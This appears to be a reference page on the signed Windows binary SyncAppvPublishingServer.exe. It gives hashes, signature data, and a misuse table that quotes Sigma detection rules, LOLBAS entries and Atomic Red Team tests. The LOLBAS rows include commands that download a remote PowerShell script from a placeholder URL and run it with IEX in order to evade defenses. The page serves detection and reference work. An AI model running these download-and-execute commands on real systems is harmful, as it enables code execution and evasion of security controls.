---
title: SyncAppvPublishingServer.exe | 
excerpt: What is SyncAppvPublishingServer.exe?
---

# SyncAppvPublishingServer.exe 

* File Path: `C:\Windows\system32\SyncAppvPublishingServer.exe`

## Hashes

Type | Hash
-- | --
MD5 | `5354113EC1C24E84613C53467F51E133`
SHA1 | `417B8A86886C304184AD68966CA188C81D0EF045`
SHA256 | `BCF02179AC47CE43DD46BF50D0F758B49F925DAE41A3263167119FA1138A6214`
SHA384 | `85BDFB444867ADB44E8D8F3AFD9E526FC3519F7FC76FCDD7351E00FD8F1066F03F7BE1441FD9FF5F3392791B54280E9C`
SHA512 | `182DA303B47F219C3D7FE6A9A9743E4C84FB088F8F3E0831F15B00616BEF06EB215CD7BEEEAEF32900EBC9AFCB8F0AE2CB17C2961CEB9F8FF86F08F7808CD21A`
SSDEEP | `768:uWqD/7ecTnUtXzu81lWGFNIRTShXj1Pwjz:7LcTnCu82GFNI5StpPo`
IMP | `FAECF41B059F08D0AF080D7BEABDBFCC`
PESHA1 | `08249EDDA66C36BB62AF0978180737EC207524CE`
PE256 | `6345C4D5219466E608F682360D69F4D7C1AC0EA29CB09F359E840D0797A2D7FC`

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: 
* Product Name: 
* Company Name: 
* File Version: 
* Product Version: 
* Language: 
* Legal Copyright: 
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/64
* VirusTotal Link: https://www.virustotal.com/gui/file/bcf02179ac47ce43dd46bf50d0f758b49f925dae41a3263167119fa1138a6214/detection/


## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.exe` being misused. While `SyncAppvPublishingServer.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_in_memory_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml) | `- '\syncappvpublishingserver.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `ContextInfo\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `ScriptBlockText\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `title: SyncAppvPublishingServer Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- '\SyncAppvPublishingServer.vbs'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Name: SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | - [Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution](#atomic-test-1---syncappvpublishingserver-signed-script-powershell-command-execution) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | ## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | - [Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code](#atomic-test-2---syncappvpublishingserver---execute-arbitrary-powershell-code) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | ## Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | SyncAppvPublishingServer.exe "n; #{powershell_code}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


